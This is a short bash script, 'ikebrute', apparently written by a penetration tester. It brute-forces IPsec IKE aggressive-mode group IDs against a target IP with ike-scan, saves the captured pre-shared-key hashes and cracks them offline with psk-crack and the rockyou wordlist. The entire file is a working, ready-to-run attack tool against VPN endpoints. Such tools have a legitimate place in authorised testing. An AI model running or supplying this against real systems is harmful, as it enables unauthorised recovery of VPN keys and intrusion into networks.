#!/bin/bash

# ikebrute v1.0
# Simply runs through a wordlist of default/common group IDs and parses each hash to a separate file to be cracked offline"
# Kevin Gilstrap, Lead Sr. Penetration Tester
# Sungard Availability Services, Information Security Consulting

# Checks for root
if [ "$(whoami)" != "root" ]; then
	clear	
	echo "Please run as root"
exit 0
fi
# Checks for Usage
if [ -z "$1" ]; then
	clear
        echo "echo [*]  Usage:  sh ikebrute.sh [TARGET IP]"
exit 0
fi
# Checks to verify aggressive mode is enabled
echo "[*]  Checking if Aggressive mode is enabled"
aggressive=$(ike-scan -M $1 --id=test -P -A | grep "Ending")
if [ -z "$aggressive" ]; then
	clear
	echo "Aggressive Mode is not enabled"
	exit 0
fi
# Captures hashes
clear
echo "[*]  Capturing hashes"
for i in $(cat /opt/ikebrute/wordlist.dic); do
	echo $i
	ike-scan -M $1 --id=$i -P -A | tail -n 2 | grep -v "Ending" | tee $i.hash
done
clear
echo "[*]  Compressing the hashes to an archive"
basefile=$(echo $1 | tr -d ".")
tar -czvf $basefile.tar.gz /opt/ikebrute/*.hash
#echo "[*]  Performing cleanup"
#rm -rf /opt/ikebrute/*.hash
#Cracking hashes
clear
echo "[*]  Cracking hashes"
for x in $(ls | grep hash); do
	psk-crack $x --dictionary=/usr/share/wordlists/rockyou.txt | tee -a pskcrack.out
done
echo "[*]  Complete"
exit 0
